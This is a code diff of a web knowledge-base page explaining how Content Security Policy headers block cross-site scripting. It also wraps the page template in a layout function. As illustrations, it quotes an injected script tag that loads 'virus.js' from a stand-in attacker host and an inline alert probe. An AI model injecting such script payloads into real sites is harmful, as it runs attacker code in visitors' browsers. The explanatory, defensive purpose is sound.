@@ -4,9 +4,16 @@ description: A powerful HTTP header that serves as the ultimate defense against 
 ---
 import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'
 
-<ConceptTemplate title="CSP (Content Security Policy)">
+export default function Layout({ children }) {
+  return (
+    <ConceptTemplate title="CSP (Content Security Policy)">
+      {children}
+    
+  </ConceptTemplate>
+  )
+}
 
-The Same-Origin Policy stops hackers from reading external data, but it doesn't stop **XSS (Cross-Site Scripting)**. 
+The Same-Origin Policy stops hackers from reading external data, but it doesn't stop **XSS (Cross-Site Scripting)**.
 If a hacker manages to inject `<script src="https://hacker.com/virus.js"></script>` into your webpage's comments section, the browser will blindly execute the virus, assuming you put it there intentionally.
 
 To stop this, servers send a **Content Security Policy (CSP)** HTTP header.
@@ -20,8 +27,13 @@ Example Header:
 
 If a hacker injects the `virus.js` script tag, the browser will check the CSP header. It will see that scripts are only legally allowed to load from `'self'` (your own domain) or `apis.google.com`. Because `hacker.com` is not on the whitelist, the browser will aggressively block the script from executing and throw a massive red error in the console.
 
+
 <Callout icon="warning" title="Banning Inline Scripts">
+
+
   By default, a strong CSP will completely ban all inline scripts (e.g., `<script>alert(1)</script>` or `onClick="doSomething()"`). The browser enforces that all JavaScript must be loaded from external, whitelisted `.js` files. This instantly neutralizes 99% of all XSS injection attacks.
+
+
 </Callout>
 
-</ConceptTemplate>
+
